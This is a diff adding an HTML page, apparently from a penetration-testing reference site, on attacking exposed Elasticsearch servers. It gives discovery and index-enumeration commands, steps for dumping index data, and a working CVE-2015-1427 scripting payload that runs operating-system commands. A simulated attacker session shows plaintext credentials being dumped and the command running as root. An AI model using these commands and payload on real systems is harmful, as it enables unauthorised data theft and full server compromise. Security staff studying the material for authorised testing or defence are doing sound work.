@@ -1,0 +1,199 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">Elasticsearch Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>NoSQL Databases</strong> • Focus: <strong>Elasticsearch Abuse & Remote Code Execution</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    Elasticsearch (TCP/9200) is a NoSQL search and analytics engine widely deployed 
+    in enterprise and cloud environments. Exposed Elasticsearch services often lack 
+    authentication, leaving sensitive indices open to anyone. Older versions allowed 
+    remote code execution (RCE) via dynamic scripting or Groovy scripts. 
+    Attackers exploit Elasticsearch to enumerate indices, exfiltrate data, and 
+    achieve persistence by writing backdoors or deploying malicious scripts. 
+    Elasticsearch breaches have led to some of the largest data leaks ever recorded.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>No Authentication:</strong> Default installs historically had no auth enabled.</li>
+    <li><strong>Wide Exposure:</strong> Often exposed to the internet on TCP/9200.</li>
+    <li><strong>RCE Vulnerabilities:</strong> Outdated versions exploitable via Groovy/mvel scripting.</li>
+    <li><strong>Data Exfiltration:</strong> Indices often contain logs, credentials, or user PII.</li>
+    <li><strong>Cloud Misconfigs:</strong> Many Elasticsearch clusters in AWS/GCP/Azure are world-readable.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>Discovery:</strong> Identify Elasticsearch on TCP/9200.</li>
+    <li><strong>Authentication:</strong> Check if authentication is enabled.</li>
+    <li><strong>Enumeration:</strong> Query <code>_cat</code> APIs to list indices and nodes.</li>
+    <li><strong>Exfiltration:</strong> Download sensitive documents from indices.</li>
+    <li><strong>Exploitation:</strong> In old versions, abuse scripting engines for RCE.</li>
+    <li><strong>Impact:</strong> Massive data leaks, system-level compromise, ransomware staging.</li>
+  </ol>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Scan for Elasticsearch on TCP/9200.</li>
+    <li>Check if <code>/_cat/indices</code> returns data without auth.</li>
+    <li>Enumerate indices and documents.</li>
+    <li>Dump sensitive data from open endpoints.</li>
+    <li>If old version, attempt Groovy/mvel RCE exploits.</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Discovery
+# ------------------------------
+nmap -p9200 --script http-title,http-server-header [target]
+curl http://[target]:9200/
+
+# ------------------------------
+# List Indices
+# ------------------------------
+curl http://[target]:9200/_cat/indices?v
+
+# ------------------------------
+# Query Data
+# ------------------------------
+curl http://[target]:9200/[index]/_search?q=*
+
+# ------------------------------
+# Node Information
+# ------------------------------
+curl http://[target]:9200/_cat/nodes?v
+
+# ------------------------------
+# Exploit Old Versions (example CVE-2015-1427 RCE)
+# ------------------------------
+curl -XPOST http://[target]:9200/_search?pretty -d '{
+  "size": 1,
+  "script_fields": {
+    "pwn": {
+      "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\")"
+    }
+  }
+}'
+
+# ------------------------------
+# Example Workflow
+# ------------------------------
+nmap -p9200 192.168.1.220
+curl http://192.168.1.220:9200/_cat/indices?v
+curl http://192.168.1.220:9200/finance/_search?q=*
+  </pre>
+</section>
+
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ nmap -p9200 192.168.1.220
+PORT     STATE SERVICE
+9200/tcp open  wap-wsp
+|_http-title: Elasticsearch
+|_Server: Elasticsearch/2.3.4 (Linux)
+
+[ saide ~ ]$ curl http://192.168.1.220:9200/_cat/indices?v
+health status index    pri rep docs.count store.size
+green  open   finance  5   1   2000       5mb
+green  open   users    5   1   1200       2mb
+
+[ saide ~ ]$ curl http://192.168.1.220:9200/users/_search?q=*
+{
+  "hits": {
+    "hits": [
+      { "_source": { "username": "alice", "password": "Summer2025!" }},
+      { "_source": { "username": "bob", "password": "Password1!" }}
+    ]
+  }
+}
+
+[+] Dumped plaintext user credentials
+
+[ saide ~ ]$ curl -XPOST http://192.168.1.220:9200/_search?pretty -d '{
+  "size": 1,
+  "script_fields": {
+    "pwn": {
+      "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\")"
+    }
+  }
+}'
+{
+  "pwn": "uid=0(root) gid=0(root) groups=0(root)"
+}
+
+[+] Remote Code Execution confirmed
+    </pre>
+  </details>
+</section>
+
+<!-- Example Results -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to view sample Elasticsearch exploitation results
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+# Service Discovery
+9200/tcp open  Elasticsearch 2.3.4
+
+# Indices Found
+finance, users
+
+# Exploitation
+Dumped plaintext user credentials
+Executed OS command via Groovy script
+
+# Proof of Exploitation
+id → uid=0(root) gid=0(root)
+    </pre>
+  </details>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/9200-pentesting-elasticsearch" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Pentesting Elasticsearch
+      </a>
+    </li>
+    <li>
+      <a href="https://www.cvedetails.com/product/33372/Elasticsearch-Elasticsearch.html?vendor_id=13545" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        CVE Details – Elasticsearch Vulnerabilities
+      </a>
+    </li>
+    <li>Red Team workflow: Discover → Enum indices → Dump sensitive data → Exploit old RCE → Persistence & lateral movement.</li>
+  </ul>
+</section>
